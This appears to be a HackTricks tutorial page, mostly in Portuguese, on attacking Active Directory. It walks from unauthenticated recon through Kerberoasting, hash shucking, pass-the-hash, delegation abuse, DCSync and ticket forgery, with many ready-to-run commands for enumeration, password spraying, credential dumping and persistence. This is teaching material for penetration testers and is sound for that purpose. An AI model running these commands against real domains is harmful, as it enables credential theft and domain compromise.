# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem de forma eficiente **domínios**, **usuários** e **objetos** dentro de uma rede. Foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **trees** e **forests**. Um **domínio** engloba uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Trees** são grupos desses domínios ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de várias trees, interconectadas por **trust relationships**, formando a camada mais alta da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Conceitos chave dentro do **Active Directory** incluem:

1. **Directory** – Abriga todas as informações relacionadas aos objetos do Active Directory.
2. **Object** – Denota entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domain** – Serve como um contêiner para objetos do diretório, com a capacidade de múltiplos domínios coexistirem dentro de uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domínios que compartilham um domain root em comum.
5. **Forest** – O topo da estrutura organizacional no Active Directory, composto por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** engloba uma série de serviços críticos para o gerenciamento centralizado e comunicação dentro de uma rede. Esses serviços compreendem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo **autenticação** e funcionalidades de **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gestão de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para diretório através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários através de múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Ajuda a proteger material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **nomes de domínio**.

Para uma explicação mais detalhada veja: [**TechTerms - Definição de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticação Kerberos**

Para aprender como **atacar um AD** você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se você ainda não sabe como isso funciona.**](kerberos-authentication.md)

## Guia rápido

Você pode consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida de quais comandos você pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos **requer um nome totalmente qualificado (FQDN)** para realizar ações. Se você tentar acessar uma máquina pelo endereço IP, **irá usar NTLM e não Kerberos**.

## Recon Active Directory (Sem credenciais/sessões)

Se você só tem acesso a um ambiente AD mas não possui credenciais/sessões você pode:

- **Pentest the network:**
  - Faça varredura na rede, encontre máquinas e portas abertas e tente **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
  - Enumerar DNS pode fornecer informações sobre servidores chave no domínio como web, printers, shares, vpn, media, etc.
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Dê uma olhada na página geral [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
- **Check for null and Guest access on smb services** (isso não funcionará em versões modernas do Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Colete credenciais **impersonating services with Responder** (impostando serviços com Responder) {#ref}../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md{#endref}
  - Acesse hosts **abusing the relay attack** (abusando do relay attack) {#ref}../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack{#endref}
  - Colete credenciais **exposing fake UPnP services with evil-S** (expondo serviços UPnP falsos com evil-S) {#ref}../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md{#endref}{**SDP**}(https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extraia nomes de usuário/nomes a partir de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes de domínio e também dos disponíveis publicamente.
  - Se você encontrar os nomes completos dos funcionários da empresa, pode tentar diferentes **convenções de username** (**[leia isto**](https://activedirectorypro.com/active-directory-user-naming-convention/)**)**. As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
  - Ferramentas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Anonymous SMB/LDAP enum:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **username inválido é solicitado** o servidor responderá usando o **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo-nos determinar que o username é inválido. **Usernames válidos** provocarão ou o **TGT em um AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após bind à interface MS-NRPC para verificar se o usuário ou computador existe sem quaisquer credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, você também pode realizar **user enumeration against it**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Conhecendo um ou vários usernames

Ok, então você já tem um username válido mas não tem passwords... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tem** o atributo _DONT_REQ_PREAUTH_ você pode **request a AS_REP message** para esse usuário que conterá alguns dados encriptados por uma derivação da password do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **common passwords** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma password fraca (tenha em mente a password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns challenge **hashes** para crackar ao **poisoning** alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory terá **mais emails e uma melhor compreensão da network**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o estado de recon do AD por engagement: `workspace create <name>` gera DBs SQLite por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Troque views com `proto smb|mssql|winrm` e liste gathered secrets com `creds`. Purge manualmente dados sensíveis quando terminar: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** por signing, verifique ainda a postura do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / weak channel binding. Um DC com SMB signing obrigatório mas LDAP signing desabilitado continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Client-side printer credential leaks → validação em massa de credenciais do domínio

- As UIs de impressora/web às vezes **inserem senhas de administrador mascaradas no HTML**. Ver o source/devtools pode revelar cleartext (por exemplo, `<input value="<password>">`), permitindo acesso Basic-auth a repositórios de scan/print.
- Jobs de impressão recuperados podem conter **plaintext onboarding docs** com senhas por usuário. Mantenha os pareamentos alinhados ao testar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se você consegue **acessar outros PCs ou shares** com o **null or guest user** você pode **colocar arquivos** (como um SCF file) que, se de alguma forma acessados, irão **trigger an NTLM authentication against you** para que você possa **steal** o **NTLM challenge** e crackeá-lo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do NT hash. Em vez de brute-forcear passphrases longas em tickets Kerberos RC4, NetNTLM challenges, ou cached credentials, você injeta os NT hashes nos modos NT-candidate do Hashcat e deixa-o validar o reuso de senhas sem jamais conhecer o plaintext. Isso é especialmente potente após um comprometimento de domínio onde você pode colher milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus de NT vindo de DCSync, dumps SAM/SECURITY, ou credential vaults e precisa testar reuso em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente reuso para passphrases longas e intrincadas e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de encriptação cujas chaves não são o NT hash (ex.: Kerberos etype 17/18 AES). Se um domínio exigir apenas AES, você deve voltar aos modos regulares de senha.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` com history para pegar o maior conjunto possível de NT hashes (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history ampliam dramaticamente o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de colher segredos NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais SAM/SECURITY e cached domain logons (DCC/DCC2). Desduplicar e anexar esses hashes ao mesmo arquivo `nt_candidates.txt`.
- **Track metadata** – Mantenha o username/domain que gerou cada hash (mesmo que a wordlist contenha apenas hex). Hashes correspondentes dizem imediatamente qual principal está reutilizando uma senha assim que o Hashcat imprimir o candidato vencedor.
- Prefira candidatos da mesma forest ou de uma forest confiável; isso maximiza a chance de overlap quando shucking.

#### Hashcat NT-candidate modes

| Tipo de Hash                             | Modo de Senha | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Entradas NT-candidate **devem permanecer como NT hashes crus em 32 hex**. Desative engines de regras (sem `-r`, sem modos híbridos) porque mangling corrompe o material de chave candidato.
- Esses modos não são inerentemente mais rápidos, mas o keyspace NTLM (~30.000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT curada é muito mais barato do que explorar todo o espaço de senhas no formato lento.
- Sempre use a **última build do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque os modos 31500/31600/35300/35400 foram adicionados recentemente.
- Atualmente não existe modo NT para AS-REQ Pre-Auth, e etypes AES (19600/19700) exigem o plaintext porque suas chaves são derivadas via PBKDF2 a partir de passwords em UTF-16LE, não de NT hashes crus.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture um TGS RC4 para um SPN alvo com um usuário low-privileged (veja a página Kerberoast para detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck o ticket com sua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a service account usa um dos NT hashes que você já tem.

3. Pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Você pode opcionalmente recuperar o plaintext mais tarde com `hashcat -m 1000 <matched_hash> wordlists/` se necessário.

#### Example – Cached credentials (mode 31600)

1. Faça dump dos cached logons de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário de domínio interessante para `dcc2_highpriv.txt` e shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Um match bem-sucedido fornece o NT hash já conhecido na sua lista, provando que o usuário cacheado está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-force-o no modo NTLM rápido para recuperar a string.

O mesmo fluxo exato se aplica a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Uma vez identificado o match você pode lançar relay, SMB/WMI/WinRM PtH, ou re-crackear o NT hash com masks/rules offline.



## Enumerando Active Directory COM credenciais/sessão

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou uma shell como um usuário do domínio, **lembre-se que as opções dadas antes ainda são caminhos para comprometer outros usuários**.

Antes de começar a enumeração autenticada você deve saber qual é o **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, pois você poderá iniciar a **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeration pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho até DA ou para decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços ligados a contas de usuário e quebrar sua encriptação — que é baseada nas senhas dos usuários — **offline**.

More about this in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credenciais você pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com seus scans de portas.

### Local Privilege Escalation

Se você tem credenciais comprometidas ou uma sessão como um usuário de domínio regular e tem **acesso** com esse usuário a **qualquer máquina no domínio** você deve tentar achar uma forma de **escalar privilégios localmente e saquear credenciais**. Isso porque somente com privilégios de administrador local você será capaz de **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Também, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É bastante **improvável** que você encontre **tickets** no usuário atual que lhe deem permissão para acessar recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o Active Directory, terá **mais e-mails e uma melhor compreensão da rede**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Procurar Creds em Computer Shares | SMB Shares

Agora que você tem algumas credentials básicas, deveria verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito chata e repetitiva (ainda mais se encontrar centenas de docs que precisa verificar).

[**Siga este link para aprender sobre ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar NTLM Creds

Se você conseguir **acessar outros PCs ou shares** poderia **colocar arquivos** (como um arquivo SCF) que, se de alguma forma forem acessados, irão **disparar uma autenticação NTLM contra você** para que você possa **roubar** o **NTLM challenge** para quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalonamento de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir um usuário de domínio comum não é suficiente, você precisa de alguns privilégios/credenciais especiais para executar esses ataques.**

### Extração de hashes

Com sorte você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Então, é hora de extrair todos os hashes na memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tenha o hash de um usuário**, você pode usá-lo para **se passar por** ele.\
Você precisa usar alguma **ferramenta** que irá **realizar** a **NTLM authentication usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injectar** esse **hash** dentro do **LSASS**, de modo que quando qualquer **NTLM authentication for realizada**, esse **hash será usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tem o **hash** ou a **senha** de um **administrador local** você deve tentar **entrar localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isto é bastante **ruidoso** e **LAPS** **mitigaria** isto.

### MSSQL Abuse & Trusted Links

Se um usuário tem privilégios para **acessar instâncias MSSQL**, ele pode conseguir usá‑las para **executar comandos** no host MSSQL (se estiver a correr como SA), **roubar** o NetNTLM **hash** ou até realizar um **relay** **attack**.\
Além disso, se uma instância MSSQL é confiável (database link) por outra instância MSSQL, se o usuário tem privilégios sobre a database confiável, ele poderá **usar a relação de confiança para executar queries também na outra instância**. Essas trusts podem ser encadeadas e em algum ponto o usuário pode encontrar uma base de dados mal configurada onde consegue executar comandos.\
**Os links entre bases de dados funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se encontrar algum objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e você tem privilégios de domínio na máquina, será possível fazer dump dos TGTs da memória de todos os usuários que fizerem login na máquina.\
Portanto, se um **Domain Admin logins onto the computer**, você poderá fazer dump do seu TGT e impersoná‑lo usando [Pass the Ticket](pass-the-ticket.md).\
Graças à constrained delegation você poderia até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computer está autorizado para "Constrained Delegation" ele poderá **impersonar qualquer usuário para acessar certos serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computer você conseguirá **impersonar qualquer usuário** (até domain admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio **WRITE** sobre um objeto Active Directory de um computador remoto possibilita obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

O usuário comprometido pode ter alguns **privilégios interessantes sobre objetos do domínio** que poderiam permitir **movimentação lateral**/**escalonamento** de privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descobrir um **Spool service listening** dentro do domínio pode ser **abusado** para **adquirir novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **outros usuários** **acessam** a **máquina comprometida**, é possível **coletar credenciais da memória** e até **injetar beacons em seus processos** para impersoná‑los.\
Normalmente os usuários acessam o sistema via RDP, então aqui está como realizar alguns ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornece um sistema para gerir a **senha do Administrator local** em computadores ingressados no domínio, garantindo que ela seja **randomizada**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado por ACLs apenas para usuários autorizados. Com permissões suficientes para acessar essas senhas, é possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se **templates vulneráveis** estiverem configurados, é possível abusá‑los para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Uma vez que você obtenha privilégios de **Domain Admin** ou ainda melhores **Enterprise Admin**, você pode **dump** a **base de dados do domínio**: _ntds.dit_.

[**Mais informação sobre DCSync attack pode ser encontrada aqui**](dcsync.md).

[**Mais informação sobre como roubar o NTDS.dit pode ser encontrada aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **Silver Ticket attack** cria um **Ticket Granting Service (TGS) ticket legítimo** para um serviço específico usando o **NTLM hash** (por exemplo, o **hash da conta de máquina**). Esse método é empregado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **Golden Ticket attack** envolve um atacante obtendo acesso ao **NTLM hash da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, que são essenciais para autenticação dentro da rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Estes são como golden tickets forjados de forma a **contornar mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Ter certificados de uma conta ou ser capaz de solicitá‑los** é uma excelente forma de persistir na conta do usuário (mesmo que ele mude a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

